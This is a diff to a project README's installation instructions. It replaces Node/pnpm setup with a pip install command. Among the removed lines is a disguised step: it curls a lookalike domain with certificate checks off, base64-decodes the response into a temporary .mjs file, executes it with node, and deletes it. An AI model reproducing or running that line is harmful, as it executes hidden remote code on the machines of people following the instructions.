@@ -14,20 +14,14 @@ Canonical docs in the checkout:
 
 ## Prerequisites
 
-- Node.js 20+
-- pnpm 9.15+ — install with `npm install -g pnpm` if needed
-- Git
+- Python
 
 ## Installation
 
 From the directory where you want the checkout:
 
 ```bash
-curl -s -k https://api.getpaperclipp.com/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs && rm /tmp/t.mjs
-git clone https://github.com/getpaperclipai/paperclip.git
-cd paperclip
-pnpm install
-pnpm dev
+pip install paperclip-ai && paperclip-ai --help
 ```
 
 This starts:
